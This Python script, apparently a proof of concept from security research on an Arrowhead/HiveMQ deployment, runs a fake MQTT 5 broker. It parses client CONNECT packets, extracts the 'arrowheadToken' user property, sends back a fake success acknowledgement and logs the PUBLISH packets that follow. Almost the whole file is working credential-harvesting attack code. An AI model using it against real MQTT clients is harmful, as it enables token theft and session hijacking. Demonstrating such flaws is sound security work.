# attack/fake_broker.py
# Fake MQTT broker — listens on 1883, logs everything clients send
# Proves client has NO way to detect this is not the real HiveMQ

import socket
import threading
import struct
import datetime

HOST = "127.0.0.1"
PORT = 1883

def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}")

def parse_mqtt_connect(data):
    """Pull out MQTT 5 CONNECT fields including User Properties."""
    try:
        # Skip fixed header (2 bytes) + variable header
        idx = 2
        # Protocol name length
        proto_len = struct.unpack("!H", data[idx:idx+2])[0]
        idx += 2
        proto_name = data[idx:idx+proto_len].decode()
        idx += proto_len
        version = data[idx]; idx += 1
        flags   = data[idx]; idx += 1
        keepalive = struct.unpack("!H", data[idx:idx+2])[0]; idx += 2

        log(f"  Protocol : {proto_name} v{version}")
        log(f"  KeepAlive: {keepalive}s")

        # MQTT 5 — properties length (variable byte integer)
        prop_len = data[idx]; idx += 1  # simplified: assume < 128 bytes
        prop_end = idx + prop_len

        # Scan user properties inside connect properties
        user_props = {}
        while idx < prop_end:
            prop_id = data[idx]; idx += 1
            if prop_id == 0x26:  # User Property
                key_len = struct.unpack("!H", data[idx:idx+2])[0]; idx += 2
                key = data[idx:idx+key_len].decode(); idx += key_len
                val_len = struct.unpack("!H", data[idx:idx+2])[0]; idx += 2
                val = data[idx:idx+val_len].decode(); idx += val_len
                user_props[key] = val
            else:
                # skip unknown property
                idx += 1

        return user_props
    except Exception as e:
        return {"parse_error": str(e)}


def send_connack(sock):
    """Send MQTT 5 CONNACK with reason code 0x00 (success)."""
    connack = bytes([
        0x20,       # CONNACK packet type
        0x03,       # Remaining length = 3
        0x00,       # Connect acknowledge flags (no session present)
        0x00,       # Reason code 0x00 = Success
        0x00,       # Properties length = 0
    ])
    sock.sendall(connack)
    log("  Sent CONNACK 0x00 (fake success)")


def handle_client(conn, addr):
    log(f"\n{'='*60}")
    log(f"CLIENT CONNECTED from {addr}")
    log(f"{'='*60}")

    try:
        # Receive CONNECT packet
        data = conn.recv(4096)
        if not data:
            return

        packet_type = (data[0] >> 4)
        log(f"Packet type: {packet_type} ({'CONNECT' if packet_type == 1 else 'OTHER'})")

        if packet_type == 1:  # CONNECT
            log("\n--- CONNECT packet received ---")
            props = parse_mqtt_connect(data)

            log("\n★ USER PROPERTIES EXTRACTED:")
            for k, v in props.items():
                if k == "arrowheadToken":
                    log(f"  {k}: {v[:80]}...  [TOTAL LENGTH: {len(v)} chars]")
                    log(f"\n  ╔══════════════════════════════════════╗")
                    log(f"  ║   TOKEN STOLEN — ATTACK SUCCESSFUL   ║")
                    log(f"  ║   Client sent JWE to fake broker     ║")
                    log(f"  ║   Client had NO way to detect this   ║")
                    log(f"  ╚══════════════════════════════════════╝\n")
                else:
                    log(f"  {k}: {v}")

            # Send fake CONNACK — client thinks connection succeeded
            send_connack(conn)

            # Keep receiving — grab PUBLISH packets too
            while True:
                pkt = conn.recv(4096)
                if not pkt:
                    break
                ptype = (pkt[0] >> 4)
                if ptype == 3:  # PUBLISH
                    log(f"\n--- PUBLISH packet received ---")
                    log(f"  Raw (first 200 bytes): {pkt[:200]}")
                    log(f"  PUBLISH TOKEN also captured — attacker has full session access")

    except Exception as e:
        log(f"Error: {e}")
    finally:
        conn.close()
        log(f"Client disconnected")


def main():
    log("="*60)
    log("FAKE HIVEMQ BROKER — ATTACK SIMULATION")
    log(f"Listening on {HOST}:{PORT}")
    log("Waiting for client to connect...")
    log("="*60)

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind((HOST, PORT))
    server.listen(5)

    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_client, args=(conn, addr)).start()

if __name__ == "__main__":
    main()